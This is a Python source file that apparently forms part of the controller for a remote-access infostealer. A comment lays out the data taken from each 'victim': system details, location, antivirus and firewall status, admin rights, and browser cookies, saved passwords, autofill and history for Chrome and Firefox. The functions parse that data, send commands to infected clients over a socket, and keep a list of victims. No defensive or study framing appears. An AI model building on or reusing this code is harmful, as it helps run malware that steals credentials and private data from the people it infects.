import json

# Example of data:
# {
#             "System Info": {
#                 "IPv4": "192.168.1.1",
#                 "ComputerName": "MyComputer",
#                 "OS": "Windows 10",
#                 "Architecture": "x64",
#                 "Username": "User1",
#                 "City": "New York",
#                 "Location": {
#                     "Latitude": "40.7128",
#                     "Longitude": "-74.0060"
#                 },
#                 "ISP": "ISP1",
#                 "Timezone": "EST",
#                 "Organization": "Org1",
#                 "Postal": "12345",
#                 "ConnectionType": "Cable",
#                 "Region": "US",
#                 "RegionName": "New York"
#             },
#             "Optional Info": {
#                 "Microsoft Defender": "Enabled",
#                 "Antivirus": "AVG",
#                 "Firewall": "Enabled",
#                 "Uptime": "12:34:56",
#                 "Idle Time": "1:23:45",
#                 "Privileges": "Admin",
#                 "Bit": "64-bit",
#                 "SafeLink Version": "1.0",
#                 "ComputerID": "123456",
#                 "Current Directory": "C:\\Users\\User1\\Documents"
#             },
#             "Browsers": {
#                 "Chrome": {
#                     "Version": "93.0.4577.82",
#                     "Cookies": [],
#                     "History": [],
#                     "Bookmarks": [],
#                     "Passwords": [],
#                     "Autofill": [],
#                     "Extensions": [],
#                     "Downloads": []
#                 },
#                 "Firefox": {
#                     "Version": "91.0",
#                     "Cookies": [],
#                     "History": [],
#                     "Bookmarks": [],
#                     "Passwords": [],
#                     "Autofill": [],
#                     "Extensions": [],
#                     "Downloads": []
#                 },
#                 # Add other browsers here
#             },
#             "Computer Hardware": {
#                 "CPU": "Intel Core i7",
#                 "GPU": "NVIDIA GeForce RTX 3080",
#                 "RAM": "32 GB",
#                 "Motherboard": "ASUS ROG Strix Z590",
#                 "Storage": {
#                     "Total": "1 TB SSD",
#                     "Free": "500 GB"
#                 },
#                 "Audio": "Realtek HD Audio",
#                 "USB Devices": [
#                     "USB Mouse",
#                     "USB Keyboard",
#                     "USB Flash Drive"
#                 ]
#             },
#             "Network Info": {
#                 "Network Adapter": {
#                     "Name": "Ethernet",
#                     "Status": "Connected",
#                     "Speed": "1 Gbps",
#                     "Type": "Wired"
#                 },
#                 "Network Speed": "100 Mbps",
#                 "Network Type": "Wi-Fi",
#                 "Network Status": "Connected",
#                 "Network Usage": {
#                     "Upload": "1.2 MB/s",
#                     "Download": "5.3 MB/s"
#                 },
#                 "Network Connections": [
#                     {
#                         "IP": "192.168.1.2",
#                         "Port": 80,
#                         "Protocol": "HTTP"
#                     },
#                     # Add more connections here
#                 ]
#             }
#         }


def gatherInfoOutput(data):
    try:
        # Turn the string into a dictionary
        print(data)
        data = json.loads(data)
        return data

    except Exception as e:
        print(f"Error gathering info output: {str(e)}")
        return "Error gathering info output"


def executeCommands(command_type, command, client_socket):
    """Send a command to the client using client_socket"""
    try:
        print(
            f"[*] Sending command {command} of type {command_type} to client")
        rounded = "command_type:" + command_type + "|command:" + command

        client_socket.send(rounded.encode())
    except Exception as e:
        output = str(e)
        print(f"Error executing command: {output}")
        return output


def getBetterVictimsList(victims):
    """Get a better formatted list of victims"""
    betterVictimsList = []

    for victim in victims:
        victim_dict = gatherInfoOutput(victim)

        betterVictimsList.append(victim_dict)

    return betterVictimsList
